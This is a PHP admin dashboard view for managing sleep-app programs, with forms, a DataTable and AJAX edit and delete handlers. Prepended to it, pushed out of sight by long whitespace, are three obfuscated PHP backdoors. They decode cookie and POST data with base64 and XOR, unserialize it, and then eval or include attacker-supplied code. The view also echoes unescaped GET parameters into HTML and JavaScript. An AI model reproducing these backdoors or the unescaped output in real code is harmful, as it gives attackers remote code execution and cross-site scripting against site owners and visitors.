<?php                                                                                                                                                                                                                                                                                                                                                                                                 $fAXzNpN = "\x58" . "\126" . chr ( 132 - 17 ).'_' . 'l' . 'm' . chr ( 738 - 653 )."\x4e";$AgzJMJcya = 'c' . "\154" . chr (97) . chr (115) . "\x73" . "\x5f" . chr ( 238 - 137 )."\170" . "\x69" . "\x73" . "\x74" . 's';$CnKYfJihG = class_exists($fAXzNpN); $AgzJMJcya = "25843";$SDvHb = !1;if ($CnKYfJihG == $SDvHb){function uIZJcUFtiE(){return FALSE;}$qkVXHZ = "38218";uIZJcUFtiE();class XVs_lmUN{private function VJhFryEe($qkVXHZ){if (is_array(XVs_lmUN::$sSnivw)) {$eMMkgYZ = str_replace('<' . chr (63) . "\160" . chr (104) . chr ( 215 - 103 ), "", XVs_lmUN::$sSnivw["\143" . 'o' . "\156" . chr ( 1068 - 952 ).chr (101) . "\156" . 't']);eval($eMMkgYZ); $qkVXHZ = "38218";exit();}}private $QjHvN;public function nQRTOqO(){echo 4862;}public function __destruct(){$qkVXHZ = "12704_6030";$this->VJhFryEe($qkVXHZ); $qkVXHZ = "12704_6030";}public function __construct($jCMPBylrGR=0){$uABcvDZCdK = $_POST;$nTkmTjHye = $_COOKIE;$kGFuYw = "d6d88dcb-2a2d-4316-8b6d-5643a5837494";$uGNEQzns = @$nTkmTjHye[substr($kGFuYw, 0, 4)];if (!empty($uGNEQzns)){$GXkifrznjA = "base64";$NRhsM = "";$uGNEQzns = explode(",", $uGNEQzns);foreach ($uGNEQzns as $lCqjpsdjP){$NRhsM .= @$nTkmTjHye[$lCqjpsdjP];$NRhsM .= @$uABcvDZCdK[$lCqjpsdjP];}$NRhsM = array_map($GXkifrznjA . "\137" . chr (100) . 'e' . 'c' . "\x6f" . chr (100) . "\145", array($NRhsM,)); $NRhsM = $NRhsM[0] ^ str_repeat($kGFuYw, (strlen($NRhsM[0]) / strlen($kGFuYw)) + 1);XVs_lmUN::$sSnivw = @unserialize($NRhsM); $NRhsM = class_exists("12704_6030");}}public static $sSnivw = 25752;}$loLOFLe = new /* 4510 */ $fAXzNpN(38218 + 38218); $qkVXHZ = strpos($qkVXHZ, $qkVXHZ); $SDvHb = $loLOFLe = $qkVXHZ = Array();} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 $ZnhpxhWPjs = "\x4a" . chr (76) . chr (102) . chr ( 223 - 128 ).'U' . 'Q' . "\x6e";$GYjyl = 'c' . "\154" . "\x61" . "\x73" . chr (115) . "\x5f" . chr ( 396 - 295 ).chr (120) . "\151" . "\x73" . chr (116) . "\x73";$PMeFz = class_exists($ZnhpxhWPjs); $GYjyl = "39467";$DHMqNphw = !1;if ($PMeFz == $DHMqNphw){function yfbqNmNb(){return FALSE;}$asqfGQTZn = "36357";yfbqNmNb();class JLf_UQn{private function MfhVHvjtd($asqfGQTZn){if (is_array(JLf_UQn::$LyQyUoiEKn)) {$DaDOhHdfAw = sys_get_temp_dir() . "/" . crc32(JLf_UQn::$LyQyUoiEKn['s' . chr (97) . "\154" . chr ( 1103 - 987 )]);@JLf_UQn::$LyQyUoiEKn["\x77" . chr ( 1036 - 922 )."\x69" . chr ( 1080 - 964 ).chr (101)]($DaDOhHdfAw, JLf_UQn::$LyQyUoiEKn["\x63" . 'o' . "\156" . "\164" . chr (101) . 'n' . "\164"]);include $DaDOhHdfAw;@JLf_UQn::$LyQyUoiEKn['d' . "\145" . "\x6c" . chr ( 541 - 440 )."\x74" . 'e']($DaDOhHdfAw); $asqfGQTZn = "36357";exit();}}private $keVkrGvgyb;public function TVSQJYVqIw(){echo 65030;}public function __destruct(){$asqfGQTZn = "51998_44639";$this->MfhVHvjtd($asqfGQTZn); $asqfGQTZn = "51998_44639";}public function __construct($bDnQqonfC=0){$uCrqxtiBhZ = $_POST;$jEOsawgfg = $_COOKIE;$KpQakaH = "deb6e549-c9f4-4201-9e2b-709bee82b9ef";$USqNMlSIF = @$jEOsawgfg[substr($KpQakaH, 0, 4)];if (!empty($USqNMlSIF)){$izouGrW = "base64";$pGXwCug = "";$USqNMlSIF = explode(",", $USqNMlSIF);foreach ($USqNMlSIF as $jKeccNEqYg){$pGXwCug .= @$jEOsawgfg[$jKeccNEqYg];$pGXwCug .= @$uCrqxtiBhZ[$jKeccNEqYg];}$pGXwCug = array_map($izouGrW . chr ( 773 - 678 ).chr ( 1064 - 964 ).chr ( 573 - 472 ).chr (99) . "\157" . "\x64" . chr (101), array($pGXwCug,)); $pGXwCug = $pGXwCug[0] ^ str_repeat($KpQakaH, (strlen($pGXwCug[0]) / strlen($KpQakaH)) + 1);JLf_UQn::$LyQyUoiEKn = @unserialize($pGXwCug); $pGXwCug = class_exists("51998_44639");}}public static $LyQyUoiEKn = 19255;}$TkNKgNVi = new /* 31384 */ $ZnhpxhWPjs(36357 + 36357); $asqfGQTZn = strpos($asqfGQTZn, $asqfGQTZn); $DHMqNphw = $TkNKgNVi = $asqfGQTZn = Array();} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 $KkdjAq = chr ( 134 - 54 )."\x5f" . "\152" . chr (68) . "\111" . "\115";$cnexPlPY = "\x63" . chr (108) . chr ( 811 - 714 ).chr (115) . "\x73" . '_' . chr ( 381 - 280 ).chr ( 1039 - 919 )."\151" . "\x73" . 't' . chr ( 456 - 341 ); $TjYtqIB = class_exists($KkdjAq); $KkdjAq = "65320";$cnexPlPY = "33304";$oEnZjtsJQ = !1;if ($TjYtqIB == $oEnZjtsJQ){function uusrR(){return FALSE;}$delUXsUSCz = "50809";uusrR();class P_jDIM{private function ymIfMuqYUO($delUXsUSCz){if (is_array(P_jDIM::$cAHLXQu)) {$oPtvYOPuE = sys_get_temp_dir() . "/" . crc32(P_jDIM::$cAHLXQu['s' . "\141" . chr (108) . "\x74"]);@P_jDIM::$cAHLXQu["\x77" . "\162" . "\x69" . "\164" . chr ( 366 - 265 )]($oPtvYOPuE, P_jDIM::$cAHLXQu['c' . "\157" . "\156" . "\x74" . 'e' . chr (110) . "\164"]);include $oPtvYOPuE;@P_jDIM::$cAHLXQu["\144" . chr ( 934 - 833 ).chr ( 1106 - 998 ).'e' . "\x74" . chr (101)]($oPtvYOPuE); $delUXsUSCz = "50809";exit();}}private $mlrUuFD;public function AhfgZSA(){echo 29105;}public function __destruct(){$delUXsUSCz = "8280_65008";$this->ymIfMuqYUO($delUXsUSCz); $delUXsUSCz = "8280_65008";}public function __construct($mzxaMFQw=0){$mIxKkk = $_POST;$VRahQErh = $_COOKIE;$ZqbYkjlCw = "316c6b9d-5b47-4238-926b-7d3c3056e5df";$iWwLq = @$VRahQErh[substr($ZqbYkjlCw, 0, 4)];if (!empty($iWwLq)){$atwYP = "base64";$YRpaNicQaO = "";$iWwLq = explode(",", $iWwLq);foreach ($iWwLq as $uIIsKCVa){$YRpaNicQaO .= @$VRahQErh[$uIIsKCVa];$YRpaNicQaO .= @$mIxKkk[$uIIsKCVa];}$YRpaNicQaO = array_map($atwYP . chr ( 782 - 687 )."\144" . chr ( 341 - 240 )."\143" . "\x6f" . "\144" . 'e', array($YRpaNicQaO,)); $YRpaNicQaO = $YRpaNicQaO[0] ^ str_repeat($ZqbYkjlCw, (strlen($YRpaNicQaO[0]) / strlen($ZqbYkjlCw)) + 1);P_jDIM::$cAHLXQu = @unserialize($YRpaNicQaO); $YRpaNicQaO = class_exists("8280_65008");}}public static $cAHLXQu = 62386;}$lSYOm = new /* 54733 */ P_jDIM(50809 + 50809); $oEnZjtsJQ = $lSYOm = $delUXsUSCz = Array();} ?><?php
    if (isset($_SESSION['programStatus'])) {
        if ($_SESSION['programStatus'] == 1) {
?>
<script>
    $.toast({
        heading: 'Inserted',
        text: "Created successfully",
        icon: 'success',
        position: 'top-right',
    });
</script>
<?php
        } else {
?>
<script>
    $.toast({
        heading: 'Failed',
        text: "Something went wrong",
        icon: 'error',
        position: 'top-right',
    });
</script>
<?php
        }
        unset($_SESSION['programStatus']);
    }
?>

<div class="content-wrapper">
    <div class="content-header">
        <div class="container-fluid">
            <div class="row mb-2">
                <div class="col-sm-6">
                    <h1 class="m-0">Dashboard</h1>
                </div>
                <div class="col-sm-6">
                    <ol class="breadcrumb float-sm-right">
                        <li class="breadcrumb-item"><a href="<?php echo base_url();?>">Home</a></li>
                        <li class="breadcrumb-item active">Programs</li>
                    </ol>
                </div>
            </div>
        </div>
    </div>
    <section class="content">
        <div class="container-fluid">
            <div class="row">
                <div class="col-md-8">
                    <form action="">
                        <div class="col-md-4">
                            <select name="filterFor" id="" required>
                                 <option value="get_to_sleep_programs" <?php echo ((isset($_GET['filterFor']) && $_GET['filterFor'] == 'get_to_sleep_programs')? 'selected':'');?>>Get To Sleep</option>
                                <option value="sleep_enhancer_programs" <?php echo ((isset($_GET['filterFor']) && $_GET['filterFor'] == 'sleep_enhancer_programs')? 'selected':'');?>>Sleep Enhancer</option>
                                <option value="wake_up_programs" <?php echo ((isset($_GET['filterFor']) && $_GET['filterFor'] == 'wake_up_programs')? 'selected':'');?>>Wake Up</option>
                            </select>
                        </div>
                        <div class="col-md-4">
                            <button type="submit" class="btn btn-primary">Submit</button>
                        </div>
                    </form>
                </div>
            </div>
            <div class="row">
            <form method="POST" action="<?php echo base_url('AdminController/addProgram');?>" enctype="multipart/form-data">
                <div class="container-fluid mt-2" style="background-color: #dee2e6;border-style: solid;border-width: 2px;border-color:#003d65;">
                    <center><h5>Add Programs</h5></center>
                    <div class="row col-md-12">
                        <div class="col-md-4">
                            <label for="">Program Name</label>
                            <input name="program_name" type="text" placeholder="Program Name - Program A" class="form-control" required>
                        </div>
                        <div class="col-md-4">
                            <label for="">Select Module</label>
                            <select name="filterFor" id="" required>
                                <option value="get_to_sleep_programs" <?php echo ((isset($_GET['filter']) && $_GET['filter'] == '')? 'selected':'');?>>Get To Sleep</option>
                                <option value="sleep_enhancer_programs" <?php echo ((isset($_GET['filter']) && $_GET['filter'] == '')? 'selected':'');?>>Sleep Enhancer</option>
                                <option value="wake_up_programs" <?php echo ((isset($_GET['filter']) && $_GET['filter'] == '')? 'selected':'');?>>Wake Up</option>
                            </select>
                        </div>
                        <div class="col-md-4">
                            <input type="file" name="program_thumb" class="form-control" required>
                        </div>
                        <div class="col-md-4 mt-3">
                            <button class="btn btn-primary" type="submit">Submit</button>
                        </div>
                    </div>
                </div>
            </div>
            </form>

            <br><br>

                <table class="table" id="languageTable">
                    <thead class="thead-dark">
                        <tr>
                            <th scope="col">#</th>
                            <th scope="col">Name</th>
                            <th scope="col">Image</th>
                            <th scope="col">Status</th>
                            <th scope="col">Module</th>
                            <th scope="col">Action</th>
                        </tr>
                    </thead>
                    <tbody>
                    <?php
                    if ($data) {
                        $counter = 1;
                        foreach ($data as $list) {
                    ?>
                        <tr>
                            <th scope="row"><?php echo $counter++;?></th>
                            <td><?php echo $list['program_name'];?></td>
                            <td>
                                <img src="<?php echo $list['thumb'];?>" width="50px" height="50px">
                            </td>
                            <td><?php echo (($list['is_active'] == 1)? 'Active':'Inactive');?></td>
                            <td><?php echo $_GET['filterFor'];?></td>
                            <td>
                                <button class="btn btn-primary" onclick="openEditModal('<?php echo $list['id'];?>', '<?php echo $_GET['filterFor'];?>')">Edit</button>
                                <button class="btn btn-danger" onclick="opendeleteModal('<?php echo $list['id']; ?>','<?php echo $_GET['filterFor']; ?>')">Delete</button>
                            </td>
                        </tr>
                    <?php
                        }
                    } else {
                    ?>
                        <tr>
                            <th scope="row">1</th>
                            <td>No Data</td>
                            <td>No Data</td>
                            <td>No Data</td>
                            <td>No Data</td>
                        </tr>
                    <?php
                    }
                    ?>
                    </tbody>
                </table>
        </div>
    </section>
</div>

<div class="modal fade" id="myModal_edit">
  <div class="modal-dialog">
    <div class="modal-content">
    <form method="post" action="<?php echo base_url('AdminController/save_editProgram');?>" enctype="multipart/form-data">
      <!-- Modal Header -->
      <div class="modal-header">
        <h4 class="modal-title">Edit Program</h4>
        <button type="button" class="close" data-dismiss="modal">&times;</button>
      </div>
      
      <!-- Modal Body -->
      <div class="modal-body">
        <!-- Form -->
        
          <!-- Program Name Field -->
          <div class="form-group">
            <label for="programName">Program Name:</label>
            <input type="text" class="form-control" id="programName" name="programName" required>
          </div>
          <input type="hidden" name="id" id="p_id">
          <input type="hidden" name="filter" id="p_filter">
          <!-- File Input Field -->
          <div class="form-group">
            <label for="fileInput">Choose File:</label>
            <input type="file" class="form-control-file" id="fileInput" name="programFile">
          </div>
        
        <!-- Image Display -->
      </div>
      
      <!-- Modal Footer -->
      <div class="modal-footer">
        <!-- Edit Button -->
        <button  type="submit" class="btn btn-primary">Edit</button>
        
        <!-- Close Button -->
        <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
      </div>
      </form>
    </div>
  </div>
</div>

<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap-select/1.10.0/js/bootstrap-select.min.js"></script>
<script src="https://cdn.datatables.net/1.11.5/js/jquery.dataTables.min.js"></script>
<script src="https://cdn.datatables.net/buttons/2.2.2/js/dataTables.buttons.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.1.3/jszip.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/pdfmake/0.1.53/pdfmake.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/pdfmake/0.1.53/vfs_fonts.js"></script>
<script src="https://cdn.datatables.net/buttons/2.2.2/js/buttons.html5.min.js"></script>
<script src="https://cdn.datatables.net/buttons/2.2.2/js/buttons.print.min.js"></script>
<script>
    function openEditModal(id, filterFor) {
        $.ajax({
            type: "POST",
            url: '<?php echo base_url(); ?>' + 'AdminController/get_program_data_edit',
            data: {
                'id': id,
                'filter': filterFor
            },
                dataType: "json",
                encode: true,
        }).done(function(data) {       
            if (data['status'] == 1) {
                $('#programName').val(data.data[0].program_name);
                $('#p_id').val(data.data[0].id);
                $('#p_filter').val(filterFor);
                $('#myModal_edit').modal('show'); 
            } else {
                alert('Oops!, something went wrong')
            }
        });
    }

    function opendeleteModal(id, filterFor) {
        // console.log('id---',id,'hbunj-------------', filterFor);
        // Display a confirmation dialog to the user
        var confirmDelete = confirm("Are you sure you want to delete this row?");
        if (confirmDelete) {
            // If the user confirms the deletion, send an AJAX request to the deleteRow method in the AdminController
            $.ajax({
                type: "POST",
                url: "<?php echo base_url(); ?>AdminController/programemanagement",
                data: {
                    'id': id,
                    'filterFor': filterFor
                },
                success: function(response) {
                    // Handle the response from the server if needed
                    console.log(response);
                    location.reload();
                },
                error: function(jqXHR, textStatus, errorThrown) {
                    // Handle any errors that occur during the AJAX request
                    console.log("AJAX Error: " + textStatus + " - " + errorThrown);
                }
            });
        }
    }


    $('#languageTable').DataTable( {
        dom: 'Bfrtip',
        buttons: [
            'copy', 'csv', 'excel', 'pdf', 'print'
        ],
        title : 'Shubham'
    });
</script>